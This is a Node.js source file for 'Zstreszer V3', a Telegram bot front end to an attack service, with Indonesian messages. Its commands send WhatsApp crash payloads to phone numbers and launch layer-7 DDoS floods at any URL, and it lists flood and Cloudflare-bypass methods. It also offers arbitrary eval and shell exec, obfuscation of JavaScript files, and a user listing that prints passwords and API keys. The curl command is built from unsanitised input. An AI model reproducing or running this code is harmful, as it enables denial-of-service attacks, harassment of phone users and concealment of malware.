require('../../config');
const fs = require('fs-extra');
const path = require('path');
const { Telegraf } = require('telegraf');
const FormData = require('form-data');
const fetch = require('node-fetch');
const smsgTelegram = require('./mytelegram');
const { addPremiumUser, getPremiumList, delPremiumUser } = require("./premium2");
const { runtime } = require('./mywhatsapp');
//==========
const BOT_DIR = path.join(__dirname, '../../sessions');
const botSessions = {};
//==========
async function saveToken(username, token) {
await fs.ensureDir(BOT_DIR);
await fs.writeJson(path.join(BOT_DIR, `${username}.json`), { token });
}
//==========
async function loadToken(username) {
try {
const data = await fs.readJson(path.join(BOT_DIR, `${username}.json`));
return data.token;
} catch {
return null;
}
}
//==========
async function removeToken(username) {
const filePath = path.join(BOT_DIR, `${username}.json`);
if (await fs.pathExists(filePath)) {
await fs.remove(filePath);
}
}
//==========
async function startBot(username, token) {
if (botSessions[username] && botSessions[username].isConnected) {
return botSessions[username].bot;
}
//==========
const bot = new Telegraf(token);
await saveToken(username, token);
botSessions[username] = { bot, token, isConnected: true };
global.telegramSessions = global.telegramSessions || {};
global.telegramSessions[username] = bot; 
//==========
bot.public = global.publikk;
bot.on(["message", "callback_query"], async (ctx) => {
if (!global.cmdtele) return;
const m = smsgTelegram(ctx);
try {
const body = m.body;
const prefix = (typeof body === "string" ? global.tellfix.find(p => body.startsWith(p)) : null) || "";
const isCmd = !!prefix;
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = args.join(" ");
const botId = ctx.botInfo.id.toString(); 
const premList = getPremiumList(botId);
const isAccess = [botId, ...global.ownerid, ...premList].includes(m.sender);
//==========
if (!bot.public && !isAccess) return;
console.log(`[ PESAN ] ${body} Dari ${m.pushName}`);
if (!isCmd) return;
//==========
//img
const videoList = [
'./public/assets/miyu.mp4',
'./public/assets/chise.mp4',
'./public/assets/sami.mp4',
'./public/assets/mori.mp4',
'./public/assets/mari.mp4',
'./public/assets/koyo.mp4'
];
const memek = videoList[Math.floor(Math.random() * videoList.length)];
//===========
const sendCrash = (type, nomor) => {
const memek = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
const perintah = `curl -X POST 'http://localhost:${global.port}/api/send-crash' \
-H 'Content-Type: application/json' \
-H 'x-api-key: ${memek}' \
-d '{"nomor": "${nomor}", "type": "${type}"}'`;
require('child_process').exec(perintah, (err, stdout, stderr) => {
if (err) return m.reply(`❌ Error: ${err.message}`);
if (stdout) return m.reply(`${stdout}`);
});
};
//=================
switch (command) {
case 'public':
if (!isAccess) return m.reply(mess.owner);
if (bot.public) return m.reply("Sudah public");
bot.public = true;
m.reply(mess.succes);
break;
//=================
case 'self':
if (!isAccess) return m.reply(mess.owner);
if (!bot.public) return m.reply("Sudah self");
bot.public = false;
m.reply(mess.succes);
break;
//=================
case 'menu':
m.reply(`Do You Mean Zstres?\nExample: ${prefix}zstres`)
break
//=================
case 'zstres':
await m.replyWithVideo({ source: fs.readFileSync(memek) }, {
caption: 
`╭──〔 Zstreszer Menu 〕──╮
│Hello, ${m.pushName}
│I'am, Zstreszer V3👋
├──────────────┤
┌─ Bot Control / Owner
│ • ${prefix}self
│ • ${prefix}public
│ • ${prefix}addacces
│ • ${prefix}delacces
│ • ${prefix}clearsesi
┌─ Web Control / Admin
│ • ${prefix}cuser
│ • ${prefix}cpremium
│ • ${prefix}cowner
│ • ${prefix}dellacc
│ • ${prefix}listuser
┌─ Combat / Bug Tools
│ • ${prefix}send
│ • ${prefix}aprela
│ • ${prefix}violet
│ • ${prefix}album
│ • ${prefix}zstresv1
│ • ${prefix}zstresv2
┌─ Ddos / 7 Layer
│ • ${prefix}attack
│ • ${prefix}listmethod
┌─ Random / Extras Tools
│ • ${prefix}eval
│ • ${prefix}ping
│ • ${prefix}upload
│ • ${prefix}enclow
│ • ${prefix}encmedium
│ • ${prefix}enchard
│ • ${prefix}encextreme
╰──────────────╯`});
await m.replyWithAudio({ source: fs.readFileSync('./public/assets/starla.mp3') }, {
ptt: true
});
break;
//=============
//exteas fitur
case 'upload': {
if (!m.quoted) return m.reply(`❌ Example: Reply Media With Caption ${prefix + command}`);
try {
const apiKey = (username === global.username) ? global.apikey : global.db.users[username]?.apiKey;
const mime = m.quoted.mime || 'application/octet-stream';
const fileUrl = await m.quoted.download();
if (!fileUrl) return m.reply('File tidak ditemukan untuk diupload.');
const response = await fetch(fileUrl);
if (!response.ok) throw new Error('Gagal download file');
const buffer = await response.buffer();
const ext = mime.split('/')[1] || 'bin';
const filename = `zstres.${ext}`;
const form = new FormData();
form.append('file', buffer, { filename, contentType: mime });
form.append('filename', filename);
const res = await fetch(`http://localhost:${global.port}/api/upload`, {
method: 'POST',
headers: {
'x-api-key': apiKey,
...form.getHeaders()
},
body: form
});
const text = await res.text();
if (!text.startsWith('{')) throw new Error(text);
const { directLink } = JSON.parse(text);
if (!directLink) return m.reply('Upload gagal. Respons tidak valid.');
await m.reply(`Berhasil upload:\n${directLink}`);
} catch (err) {
console.error(err);
await m.reply('Terjadi kesalahan saat upload.');
}
break;
}
//=================
case 'ping': {
try {
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey || '';
const res = await fetch(`http://localhost:${global.port}/api/ping`, {
headers: {
'x-api-key': apiKey
}
});
const data = await res.json();
const text = `
🖥️ System Info 🖥️

🌐 OS : ${data.os || 'Unknown'} (${data.arch || 'Unknown'})
🏷️ Host : ${data.host || 'Unknown'}

💾 RAM Total: ${data.ramTotal || 'Unknown'}
📊 RAM Used : ${data.ramUsed || 'Unknown'}
🛋️ RAM Free : ${data.ramFree || 'Unknown'}

⚙️ CPU: ${data.cpuModel || 'Unknown'}
🔢 CPU Cores: ${data.cpuCores || 'Unknown'}

⏳ VPS Uptime: ${data.vpsUptime || 'Unknown'}
🤖 Bot Uptime: ${data.botUptime || 'Unknown'}
`.trim();
await m.reply(text);
} catch (e) {
console.error('Gagal fetch /ping:', e);
await m.reply('Gagal mengambil data system info.');
}
}
break;
//===========
case 'clearsesi':
case 'csesi': {
if (!isAccess) return m.reply(mess.owner);
const folderPath = path.join('./sessions', username);
try {
const files = fs.readdirSync(folderPath).filter(f => f !== 'creds.json');
files.forEach(file => fs.unlinkSync(path.join(folderPath, file)));
m.reply(`✅ *Sesi ${username} Dibersihkan*\n• File dihapus: ${files.length}`);
} catch (err) {
console.error(err);
}
break;
}
//=================
case 'eval': {
if (!m.quoted) return m.reply(`❌ Example: Reply Msg Dengan Caption ${prefix + command}`);
const raw = m.quoted.message;
if (!raw) return 
const keys = Object.keys(raw).filter(k => !['message_id', 'from', 'chat', 'date'].includes(k));
const isi = {};
for (const k of keys) isi[k] = raw[k];
const json = JSON.stringify(isi, null, 2);
const filename = 'MessageContent.json';
await fs.writeFileSync(filename, json);
await m.reply(json);
await m.replyWithDocument(m.chat, { source: filename, filename });
await fs.unlinkSync(filename);
}
break;
//=================
case 'attack': {
if (!isAccess) return m.reply(mess.owner);
const args = text.split(" ");
if (args.length < 3) {
return m.reply(`❌ Example: ${prefix + command} <url> <time> <rate> <thread> <mode>\n\nJika mode 'quantum' cukup:\n${prefix + command} <url> <time> quantum`);
}
const [target, time, rate, thread, modeRaw] = args;
const mode = modeRaw?.toLowerCase();
const simpleOnly = ['quantum'];
if (!/^https?:\/\//.test(target)) return m.reply("❌ URL tidak valid (harus http:// atau https://)");
if (isNaN(time)) return m.reply("❌ Time harus berupa angka.");
if (!mode) return m.reply("❌ Mode tidak boleh kosong.");
const body = {
target,
time,
mode,
...(simpleOnly.includes(mode) ? {} : { rate, thread })
};
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;

try {
const res = await fetch(`http://localhost:${global.port}/api/send-attack`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'x-api-key': apiKey
},
body: JSON.stringify(body)
});
const data = await res.json();
if (!res.ok) return m.reply(`❌ Gagal: ${data?.error || 'Tidak diketahui.'}`);
m.reply(`✅ Serangan ${mode} dikirim ke:\n${target}\nDurasi: ${time}s\nMode: ${mode}`);
} catch (err) {
console.error(err);
m.reply(`❌ Terjadi kesalahan: ${err.message}`);
}
}
break;
//================
case 'listmethod': {
const methods = [
{ name: 'hentai', desc: 'Bypass UAM & JS' },
{ name: 'hold', desc: 'TLS Flood' },
{ name: 'flood', desc: 'Request Flood' },
{ name: 'bypass', desc: 'Advanced Bypass' },
{ name: 'quantum', desc: 'Simple Fast Method' },
{ name: 'mixmax', desc: 'Hybrid Bypass + Flood' },
{ name: 'thunder', desc: 'Heavy Proxy Flood' },
];
let teks = '📦 List Method Serangan:\n\n';
for (let i = 0; i < methods.length; i++) {
const mtd = methods[i];
teks += `${i + 1}. ${mtd.name}\n• ${mtd.desc}\n\n`;
}
m.reply(teks.trim());
}
break;
//============
case 'enclow':
case 'encmedium':
case 'enchard':
case 'encextreme': {
if (!m.quoted) return m.reply(`❌ Example: Reply File Js Dengan Caption ${prefix + command}`);
try {
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
const mime = m.quoted.mime || 'application/javascript';
const fileUrl = await m.quoted.download();
if (!fileUrl) return m.reply('❌ Gagal mendapatkan file');
const response = await fetch(fileUrl);
if (!response.ok) throw new Error('Gagal download file');
const buffer = await response.buffer();
const filename = `zstres.js`;
const form = new FormData();
form.append('file', buffer, { filename, contentType: mime });
form.append('filename', filename);
const mapType = {
enclow: 'low',
encmedium: 'medium',
enchard: 'hard',
encextreme: 'extreme'
};
form.append('type', mapType[command]);
const res = await fetch(`http://localhost:${global.port}/api/encrypt`, {
method: 'POST',
headers: {
'x-api-key': apiKey,
...form.getHeaders()
},
body: form
});
const text = await res.text();
if (!text.startsWith('{')) throw new Error(text);
const { encrypted } = JSON.parse(text);
if (!encrypted) return m.reply('❌ Gagal mengenkripsi file');
await m.replyWithDocument({
source: Buffer.from(encrypted, 'utf-8'),
filename: 'Z-ENC.js'
}, {
caption: 'Berhasil encrypt',
parse_mode: 'Markdown'
});
} catch (err) {
console.error(err);
await m.reply('❌ Terjadi kesalahan saat proses enkripsi');
}
break;
}
//==========
case 'addacces':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} 60123456789`);
addPremiumUser(botId, text.replace(/\D/g, ""));
m.reply(`✅ Added Premium:\n• ${text}`);
break;
//=================
case 'delacces':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} 60123456789`);
const removed = delPremiumUser(botId, text.replace(/\D/g, ""));
m.reply(removed ? `✅ Premium dihapus:\n• ${text}` : "❌ Nomor tidak ditemukan.");
break;
//=================
//cuser
case 'listuser': {
if (!isAccess) return m.reply(mess.owner);
const apiKey = (username === global.username)
? global.apikey
: global.db.users[username]?.apiKey;
try {
const res = await fetch(`http://localhost:${global.port}/api/list-users`, {
method: 'GET',
headers: {
'x-api-key': apiKey
}
});
const data = await res.json();
if (!res.ok || !data.users) return m.reply(`❌ Gagal: ${data.error}`);
if (data.users.length === 0) return m.reply('❌ Tidak ada user terdaftar.');
let teks = `📋 Daftar User Terdaftar:\n\n`;
data.users.forEach((user, i) => {
teks += `${i + 1}. ${user.username}\n`;
teks += `• Email: ${user.email}\n`;
teks += `• Password: ${user.password}\n`;
teks += `• Role: ${user.role}\n`;
teks += `• API Key: ${user.apikey}\n`;
teks += `• Usage: ${user.usage}\n\n`;
});
m.reply(teks.trim());
} catch (err) {
console.error(err);
m.reply(`❌ Terjadi kesalahan: ${err.message}`);
}
}
break;
//=================
case 'cuser':
case 'cowner':
case 'cpremium': {
if (!isAccess) return await m.reply(mess.owner);
const currentUser = username;
if (!text) return await m.reply(`❌ Example: ${prefix + command} username`);
const [newUsername] = args;
const randomText = [...Array(5)].map(() => String.fromCharCode(97 + Math.floor(Math.random() * 26))).join('');
const password = `zstres${randomText}`;
const roleMap = {
cuser: 'user',
cowner: 'owner',
cpremium: 'premium'
};
const role = roleMap[command] || 'user';
const apiKey = (currentUser === global.username)
? global.apikey
: global.db.users[currentUser]?.apiKey;
try {
const res = await fetch(`http://localhost:${global.port}/api/create-user`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'x-api-key': apiKey
},
body: JSON.stringify({ username: newUsername, password, role })
});
const data = await res.json();
if (!res.ok) return await m.reply(`❌ Gagal: ${data.error}`);
const hasil = `✅ User berhasil dibuat:
• Username : ${newUsername}
• Email : ${data.email}
• Password : ${data.password}
• Role : ${data.role}
• API Key : ${data.apiKey}
• Usage : 0
• Domain: ${global.domain}
Gunakan API Key ini untuk mengakses endpoint yang disediakan`;
if (m.quoted && m.quoted.sender) {
await bot.telegram.sendMessage(m.quoted.sender, hasil, {});
await m.reply('✅ Data akun dikirim ke pengguna');
} else {
await m.reply(hasil);
}
} catch (err) {
console.error(err);
await m.reply(`❌ Error: ${err.message}`);
}
break;
}
//=================
case 'dellacc': {
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} Username`);
const email = text + "@Zstres.my"
const pengirim = username; 
const key = pengirim === global.username
? global.apikey
: global.db.users[pengirim]?.apiKey;
try {
const res = await fetch(`http://localhost:${global.port}/api/delete-user`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'x-api-key': key
},
body: JSON.stringify({ email })
});
const data = await res.json();
if (!res.ok) return m.reply(`❌ Gagal: ${data.error}`);
await m.reply(`✅ User: ${email} berhasil dihapus`);
} catch (err) {
console.error(err);
}
}
break;
//=================
//CASE BUG
case 'send':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("testsend", text);
break;
//=================
case 'aprela':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("Aprela Invis", text);
break;
//=================
case 'violet':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("Violet Invis", text);
break;
//=================
case 'album':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("Album Invis", text);
break;
//=================
case 'zstresv1':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("ZstreszerV1", text);
break;
//=================
case 'zstresv2':
if (!isAccess) return m.reply(mess.owner);
if (!text) return m.reply(`❌ Example: ${prefix + command} <Nomor>`);
sendCrash("ZstreszerV2", text);
break;
//=================
case 'x': {
if (!isAccess) return m.reply(mess.owner);
try {
let evaled = await eval(text);
if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
await m.reply(evaled);
} catch (err) {
await m.reply(String(err));
}
}
break;
//================
case 'exec': {
if (!isAccess) return m.reply(mess.owner);
require('child_process').exec(text, (err, stdout) => {
if (err) return m.reply(`${err}`);
if (stdout) return m.reply(stdout);
});
}
break;
//================
default:
break;
}} catch (err) {
console.error("❌ ERROR:", err)}});
await bot.launch();
return bot;
}
//==========
async function stopBot(username) {
if (botSessions[username]) {
await botSessions[username].bot.stop('manual stop');
delete botSessions[username];
await removeToken(username);
console.log(`[BOT:${username}] Stopped dan token dihapus`);
}
}
//==========
async function stopBotbntr(username) {
if (botSessions[username]) {
await botSessions[username].bot.stop('manual stop');
delete botSessions[username];
console.log(`[BOT:${username}] Stopped`);
}
}
//==========
function isBotRunning(username) {
return botSessions[username] && botSessions[username].isConnected;
}
//==========
async function autoStartAllBots() {
if (!(await fs.pathExists(BOT_DIR))) return;
const files = await fs.readdir(BOT_DIR);
const jsonFiles = files.filter(file => file.endsWith('.json'));
const jobs = jsonFiles.map(async (file) => {
const username = path.basename(file, '.json');
try {
const token = await loadToken(username);
if (token) {
console.log(`[${username}] Connected Tele Bot`);
await startBot(username, token);
}
} catch (e) {
console.error(`[BOT:${username}] Gagal start otomatis:`, e.message);
}
});
await Promise.all(jobs);
}
//==========
async function startTele(username) {
const filePath = path.join(BOT_DIR, `${username}.json`);
const exists = await fs.pathExists(filePath);
if (!exists) return; 
try {
const data = await fs.readJson(filePath);
const token = data.token;
if (!token) {
return;
}
console.log(`[${username}] Connected Tele Bot`);
await startBot(username, token);
} catch (err) {
console.error(`[TELE:${username}] Gagal start:`, err.message);
}
}
//==========
module.exports = {
startBot,
stopBot,
isBotRunning,
autoStartAllBots,
stopBotbntr,
startTele
};
